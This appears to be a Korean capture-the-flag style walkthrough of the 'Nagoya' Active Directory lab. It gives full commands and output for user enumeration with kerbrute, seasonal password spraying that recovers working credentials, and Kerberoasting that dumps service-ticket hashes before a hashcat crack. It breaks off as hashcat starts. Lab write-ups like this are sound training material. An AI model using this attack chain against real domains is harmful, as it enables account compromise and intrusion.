## Nmap
```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ cat nmap.log
# Nmap 7.98 scan initiated Mon Jul  6 13:08:07 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.120.21
Nmap scan report for 192.168.120.21
Host is up (0.066s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
80/tcp    open  http              Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Nagoya Industries - Nagoya
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=nagoya.nagoya-industries.com
| Not valid before: 2026-07-05T03:36:25
|_Not valid after:  2027-01-04T03:36:25
|_ssl-date: 2026-07-06T04:10:15+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: NAGOYA-IND
|   NetBIOS_Domain_Name: NAGOYA-IND
|   NetBIOS_Computer_Name: NAGOYA
|   DNS_Domain_Name: nagoya-industries.com
|   DNS_Computer_Name: nagoya.nagoya-industries.com
|   DNS_Tree_Name: nagoya-industries.com
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-06T04:09:35+00:00
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf            .NET Message Framing
49666/tcp open  msrpc             Microsoft Windows RPC
49668/tcp open  msrpc             Microsoft Windows RPC
49676/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc             Microsoft Windows RPC
49679/tcp open  msrpc             Microsoft Windows RPC
49693/tcp open  msrpc             Microsoft Windows RPC
49708/tcp open  msrpc             Microsoft Windows RPC
49805/tcp open  msrpc             Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: NAGOYA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-07-06T04:09:39
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   65.57 ms 192.168.45.1
2   65.50 ms 192.168.45.254
3   65.99 ms 192.168.251.1
4   66.08 ms 192.168.120.21

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul  6 13:10:18 2026 -- 1 IP address (1 host up) scanned in 131.32 seconds
```

web 속성 확인

```bash
whatweb http://192.168.120.21
http://192.168.120.21 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@nagoya-industries.com,info@nagoyaindustries.com], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[192.168.120.21], JQuery, Microsoft-IIS[10.0], Script, Title[Nagoya Industries - Nagoya]
```

웹페이지 내 팀원 목록 확인
![[Pasted image 20260706141343.png]]

이름 확보 후 무차별 대입 할 목록 생성
```bash
username-anarchy -i names.txt > users.txt
```

kerbrute를 사용하여 유효한 자격증명 확인
```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ /home/kali/git/kerbrute/kerbrute_linux_amd64 userenum -d nagoya-industries.com --dc 192.168.120.21 users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 07/06/26 - Ronnie Flathers @ropnop

2026/07/06 14:36:30 >  Using KDC(s):
2026/07/06 14:36:30 >   192.168.120.21:88

2026/07/06 14:37:51 >  [+] VALID USERNAME:       rebecca.bell@nagoya-industries.com
2026/07/06 14:37:52 >  [+] VALID USERNAME:       scott.gardner@nagoya-industries.com
2026/07/06 14:37:52 >  [+] VALID USERNAME:       terry.edwards@nagoya-industries.com
2026/07/06 14:37:52 >  [+] VALID USERNAME:       holly.matthews@nagoya-industries.com
2026/07/06 14:37:52 >  [+] VALID USERNAME:       anne.jenkins@nagoya-industries.com
2026/07/06 14:37:52 >  [+] VALID USERNAME:       brett.naylor@nagoya-industries.com
2026/07/06 14:37:52 >  [+] VALID USERNAME:       melissa.mitchell@nagoya-industries.com
2026/07/06 14:37:53 >  [+] VALID USERNAME:       craig.carr@nagoya-industries.com
2026/07/06 14:37:53 >  [+] VALID USERNAME:       fiona.clark@nagoya-industries.com
2026/07/06 14:37:53 >  [+] VALID USERNAME:       patrick.martin@nagoya-industries.com
2026/07/06 14:37:53 >  [+] VALID USERNAME:       kate.watson@nagoya-industries.com
2026/07/06 14:37:53 >  [+] VALID USERNAME:       kirsty.norris@nagoya-industries.com
2026/07/06 14:37:53 >  [+] VALID USERNAME:       andrea.hayes@nagoya-industries.com
2026/07/06 14:37:54 >  [+] VALID USERNAME:       abigail.hughes@nagoya-industries.com
2026/07/06 14:37:54 >  [+] VALID USERNAME:       melanie.watson@nagoya-industries.com
2026/07/06 14:37:54 >  [+] VALID USERNAME:       frances.ward@nagoya-industries.com
2026/07/06 14:37:54 >  [+] VALID USERNAME:       sylvia.king@nagoya-industries.com
2026/07/06 14:37:54 >  [+] VALID USERNAME:       wayne.hartley@nagoya-industries.com
2026/07/06 14:37:54 >  [+] VALID USERNAME:       iain.white@nagoya-industries.com
2026/07/06 14:37:54 >  [+] VALID USERNAME:       joanna.wood@nagoya-industries.com
2026/07/06 14:37:55 >  [+] VALID USERNAME:       bethan.webster@nagoya-industries.com
2026/07/06 14:37:55 >  [+] VALID USERNAME:       elaine.brady@nagoya-industries.com
2026/07/06 14:37:55 >  [+] VALID USERNAME:       christopher.lewis@nagoya-industries.com
2026/07/06 14:37:55 >  [+] VALID USERNAME:       megan.johnson@nagoya-industries.com
2026/07/06 14:37:55 >  [+] VALID USERNAME:       damien.chapman@nagoya-industries.com
2026/07/06 14:37:55 >  [+] VALID USERNAME:       joanne.lewis@nagoya-industries.com
2026/07/06 14:38:49 >  Done! Tested 405 usernames (26 valid) in 139.416 seconds
```
![[Pasted image 20260706144017.png]]

유효 계정 있는지 확인 했지만 없음
```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ impacket-GetNPUsers nagoya-industries.com/ -usersfile valid_users.txt -no-pass -dc-ip 192.168.120.21 -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] User rebecca.bell doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User scott.gardner doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User terry.edwards doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User holly.matthews doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User anne.jenkins doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User brett.naylor doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User melissa.mitchell doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User craig.carr doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fiona.clark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User patrick.martin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User kate.watson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User kirsty.norris doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User andrea.hayes doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User abigail.hughes doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User melanie.watson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User frances.ward doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sylvia.king doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User wayne.hartley doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User iain.white doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User joanna.wood doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bethan.webster doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User elaine.brady doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User christopher.lewis doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User megan.johnson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User damien.chapman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User joanne.lewis doesn't have UF_DONT_REQUIRE_PREAUTH set

```

해당페이지가 2023년 제작했음을 확인
![[Pasted image 20260706145621.png]]

그것을 참고하여 계절로 된 무차별대입 텍스트 생성
```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ cat season_pass.txt
Spring2023
Summer2023
Fall2023
Winter2023
```

유효한 자격증명 획득 `craig.carr:Spring2023` , `fiona.clark:Summer2023`
```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ nxc smb 192.168.120.21 -u valid_users.txt -p season_pass.txt --continue-on-success
SMB         192.168.120.21  445    NAGOYA           [*] Windows 10 / Server 2019 Build 17763 x64 (name:NAGOYA) (domain:nagoya-industries.com) (signing:True) (SMBv1:False)
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\rebecca.bell:Spring2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\scott.gardner:Spring2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\terry.edwards:Spring2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\holly.matthews:Spring2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\anne.jenkins:Spring2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\brett.naylor:Spring2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\melissa.mitchell:Spring2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [+] nagoya-industries.com\craig.carr:Spring2023
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\fiona.clark:Spring2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\patrick.martin:Spring2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\kate.watson:Spring2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\kirsty.norris:Spring2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\andrea.hayes:Spring2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\abigail.hughes:Spring2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\melanie.watson:Spring2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\frances.ward:Spring2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\sylvia.king:Spring2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\wayne.hartley:Spring2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\iain.white:Spring2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\joanna.wood:Spring2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\bethan.webster:Spring2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\elaine.brady:Spring2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\christopher.lewis:Spring2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\megan.johnson:Spring2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\damien.chapman:Spring2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\joanne.lewis:Spring2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\rebecca.bell:Summer2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\scott.gardner:Summer2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\terry.edwards:Summer2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\holly.matthews:Summer2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\anne.jenkins:Summer2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\brett.naylor:Summer2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\melissa.mitchell:Summer2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [+] nagoya-industries.com\fiona.clark:Summer2023
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\patrick.martin:Summer2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\kate.watson:Summer2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\kirsty.norris:Summer2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\andrea.hayes:Summer2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\abigail.hughes:Summer2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\melanie.watson:Summer2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\frances.ward:Summer2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\sylvia.king:Summer2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\wayne.hartley:Summer2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\iain.white:Summer2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\joanna.wood:Summer2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\bethan.webster:Summer2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\elaine.brady:Summer2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\christopher.lewis:Summer2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\megan.johnson:Summer2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\damien.chapman:Summer2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\joanne.lewis:Summer2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\rebecca.bell:Fall2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\scott.gardner:Fall2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\terry.edwards:Fall2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\holly.matthews:Fall2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\anne.jenkins:Fall2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\brett.naylor:Fall2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\melissa.mitchell:Fall2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\patrick.martin:Fall2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\kate.watson:Fall2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\kirsty.norris:Fall2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\andrea.hayes:Fall2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\abigail.hughes:Fall2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\melanie.watson:Fall2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\frances.ward:Fall2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\sylvia.king:Fall2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\wayne.hartley:Fall2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\iain.white:Fall2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\joanna.wood:Fall2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\bethan.webster:Fall2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\elaine.brady:Fall2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\christopher.lewis:Fall2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\megan.johnson:Fall2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\damien.chapman:Fall2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\joanne.lewis:Fall2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\rebecca.bell:Winter2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\scott.gardner:Winter2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\terry.edwards:Winter2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\holly.matthews:Winter2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\anne.jenkins:Winter2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\brett.naylor:Winter2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\melissa.mitchell:Winter2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\patrick.martin:Winter2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\kate.watson:Winter2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\kirsty.norris:Winter2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\andrea.hayes:Winter2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\abigail.hughes:Winter2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\melanie.watson:Winter2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\frances.ward:Winter2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\sylvia.king:Winter2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\wayne.hartley:Winter2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\iain.white:Winter2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\joanna.wood:Winter2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\bethan.webster:Winter2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\elaine.brady:Winter2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\christopher.lewis:Winter2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\megan.johnson:Winter2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\damien.chapman:Winter2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\joanne.lewis:Winter2023 STATUS_LOGON_FAILURE
```

획득한 자격증명으로 bloodhound 데이터 수집
확보한 CRAIG.CARR 계정으로  SVC_HELPDESK 계정 관리 


![[Pasted image 20260706154413.png]]

![[Pasted image 20260706154341.png]]



A) Hash Crack
```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ impacket-GetUserSPNs nagoya-industries.com/craig.carr:Spring2023 -dc-ip 192.168.120.21 -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName                Name          MemberOf                                          PasswordLastSet             LastLogon                   Delegation
----------------------------------  ------------  ------------------------------------------------  --------------------------  --------------------------  ----------
http/nagoya.nagoya-industries.com   svc_helpdesk  CN=helpdesk,CN=Users,DC=nagoya-industries,DC=com  2023-04-30 16:31:06.190955  <never>
MSSQL/nagoya.nagoya-industries.com  svc_mssql                                                       2023-04-30 16:45:33.288595  2024-08-02 10:48:41.441299



[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc_helpdesk$NAGOYA-INDUSTRIES.COM$nagoya-industries.com/svc_helpdesk*$ff27c107da97f9e7c755bae8cca8f1d0$d21ba6d4194bc28611ef2974bb218ee946a7cca4461838d0a3dd0d5f0ed97ee997afedc3b8e115b624bf25e30972548f56cf70555ca49427628daabe181320edfad715dd71261ffc84adda0434382cc1033225d1ab3e050fd55852febbfe47bb60cac511bbf113fe87efc303afdf967c3ef7f5383082f24f4468533a84e847e909b4d262689c369b2bfaba6ee4b4f286d1d489f11b3de27dc591c4f3c581c1a7335013e579026af39916a3104193405fd24a1778fa18309df0357f9da376998cf80913b63dfb1dbb23c31a94115adcac48fc7e89e79eaa458b3422832c095aeccb32dfbd137dd8baaa66ca405c2fe33f3368b486cdefc1aa53991864cac90f2856bf89ee16b911f69be2fe4040cb85256eeae76dae884041ea644f9e18f7943473dce1dfa2d97b3c4c69e357f253dd4cc802a2b3a864a8db6c1cb0f3d6da5af5d4d2dd88b6a59aa54df324bc5a048294fa1678e64510d6b3811abdeb62c136c317b08551edc734e472934dc383ff4db1d147c4310782f4a5f8be4038e56a7d3623115e0fd26e3c1cc543dd0f9ff0f3345607ad189b2b009aedce8212b4b4c052e074bfee62c4d7ec0c2a5e32097ddbe9cc764cd6118b98e771ba4837d8db5abe3f02f6297950a50a57cfde8558d1889af6861f56d6acf7ce66b2003a9827ac5aece03a02c0b40742a7b900b415e29448774022ec2976018514c6b9c44a0f33a9b8c6d555b67b64b99acc6fb0d0e34c97173bd629181a9b03fb5ce9a0db02c24363342f43716b5ff8e5b3e5a0a131a3b32d4b327c4bde0cc3b67da4fb79592c443a5ef5f56329575604f1238a801b091d3343db6d2aeb37b5938b8bd1e92e81c7c5eadf6a8442f98629ab7d109501a8aa1b582226942a036a71aed1de50718f311de2f70d5e7fa585a8e836103f3be9e49dbfd1d7087ce3a832a1a27bf67ea1bab9a4e881b796a3e6c990f6fe12bbfbf8b0c27071dc32486b512489256c6b00bef372be5a2aef945b0433bcfd25115d84f2ebf974eaff75fdeea30702dca527f8d9d45f7f0a7673869046e37f39a7771da4f4b19738d2d221d27faa01b7e24aa9bb56799a576e5b812598c72da0d610ee1561bbb6925c2446176a221f633dff7b2db7c6877f87e6c34a6cf335332d984223ea9eea9b7f695d9d1ed9a1967718e631777cfbc822f4835cd6b21991db092063842670980ba53cc1ae06a3f3267932517f5203bce565180678c534ba2f3e449275a64a709c285a3d0a35aa0c1c54907dcfc8d2d673e7a9d16d42684fbc497bc64afdf9479710420fd798e536f7fb14d9aeff2219533e072697502f5d4c6912cfb4b86107cf5c3b386f13dc3c17a006c0987ec8338ef0279f8940cd70f6e0fb0de88b6b1e223a2464e50531980f4f1c1a9ac7a01480f8e65bada1f69aafc4010009cd3057b2ac4bacdf428ddaa03ee81ac17dd0fc83d442c82b7d5ca822bbfd46422570a9a91087e4de49799dafdbc2da329406104e066f9792e99d61becfd04185fef231e68b5d55adc92cadafea95f6e7d0e85d11adfac9b125098f074ec53b2fdc3a242e67dabfc30b36fb4039eb4cb2c4865a0c37fefde710bd56fef0dd
$krb5tgs$23$*svc_mssql$NAGOYA-INDUSTRIES.COM$nagoya-industries.com/svc_mssql*$6f15123e21a1df6ae63fc333287e9043$d952b84710651a54baa879d839c5cce61e18c3c495ecbd93abde51dae0079da79dc12e7fb136501d19ba16131a998bd805e038d879a9351d95fda2d5b69095069acabb63df33e64c22b6ef547a72daa6ba35e2e70573c2b5ff88848271071bd3bd9ab134aa7ff82bd14ec8122cdf7e388f7a82ffc63a2c9578183abba7399fc445fbc7fac8dfc864379c26583083082014d7d8d47c6fc920bd4f2f58342bea04eb3b30afc9e5fc53b643695cbc55226a93f2068cb42695f1377799b003a50205b10d700acb240c0586fc07c03755c2e2f4ac55ce8dd10069ec941c41d66176d5b0f013fc95c32f2c96e37fe183a8e01eca9e95d0c22c8eafb6c81ae087ed714380306f335d3e223a35fee0b6c51ab378081ba486c0a59c9b66a28571aeaea830623f230e9348be71f102c1396b0032ceed57115d3eb7b838da833b5f6fab8453351f62408e33fabe64cf01992b1a5c0d550e5ab65dc4853cbaa96324636ffeed2277685aafdadf8bd375fa98d1e10b3aaf54e73f3211c12b794a4b56ea086e16777d799585e13fec0101badb598bb5ca76f1d056ba9ba8d20874d9487e41a0550addf8ee996630770762534510de7a1807ec08b3b24cbb962f59365ebee2af08f8a3decc8b17365624e45c5b4ab4367da929cdfa651c0235402c597d6fe4e962426c7e548da1327c902f3e36aa5c1e97bd793ccc6a28ea8dfb4d73ae00ecf96a4d0595b70af2521f037ef849cdc4820bd6a09398d766820d22182cad5e53f273525e4e6d9a39981fdd3fe010865a46249b2c10fddc366adfda4f36c225e4de29ea1d39554ceedd5d3c9bdea1da67ac28ad2b33942d35b29638239276a06aa01fe148ffc7f83b9f7833402e5f48e8cfb2968dc79d8b0f709bdbd1d86fb3be59e8830831403d66c1bad00245c988987c1cf10ec9f3fc12ffd1eace7167369859ec778c174b78d9dff76c8892d9e347cb058c778bc17e100ee92da6e3295b02e01d57f4ad3a53faf971e5b480581ea2c3cd5245a0f9e5feca60495e4bf5d2997419b12af71dc9807609aaed28f8ee95f0c5057aa9bd5df17d36856356b7562f745dea43d9c2124d99589933beccf79f7f33a62202308cc542be5146ee6cdc79c4153552c38d60c42905de08f6fbb20efafa79b1cb049da42701b9c30289a0b162c1b9393ecefd194b757ead1cb0b0596a2fbba18857577de944bae022d14cb7e6dc2fe43f7807270b4c75b07904a701c5d9f86f4d85d3e1ea1d0bbb9fb9271f57d3c86ad8653a523f16fb119e0558b7669f5a6a2373583dcda379649cfcc9f358721584c9747282410f3fc861aa52ac6a246ac899cf4ba476397cf699ec9530803791d7ee9f729d717faacbb013e52b095bbaed6f4fcc8b24ca9e70ab11a43091c1bf162b660f89c2667f9ddddd494f008885bfa2758cc5a95fff0da697750fc56943f31ada247cd418dcc6138a3c433e0abd051eaf6afae03d9a35f1ecd7237db41ea55fdd85aa738cf4ed4ec2d25dfa8e4323b6f3ebf783694272e70ea07b9520f22e5b7458de9a2b740a517feb00ac077eeb9c1150ccb168de49aea691ac7ce34adb238da2104ffe723a4779116ec98c
```

확보한 해시로 크랙 진행`SVC_MSSQL/Service1`
```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

